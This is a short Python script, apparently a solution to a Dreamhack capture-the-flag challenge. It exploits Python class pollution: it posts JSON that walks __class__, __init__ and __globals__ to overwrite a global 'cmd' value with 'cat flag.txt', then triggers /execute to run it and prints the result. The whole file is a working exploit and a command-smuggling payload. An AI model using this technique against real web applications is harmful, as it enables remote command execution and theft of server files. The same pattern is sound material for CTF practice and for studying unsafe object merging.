import requests

url = "http://host8.dreamhack.games:20342"

data  = {
    "name": "hacker",
    "role": "principal",
    "__class__": { "__init__": { "__globals__": { "principal": { "cmd": "cat flag.txt" } } } }
}

requests.post(f"{url}/add_member", json=data)

res = requests.get(f"{url}/execute")

print(res.text)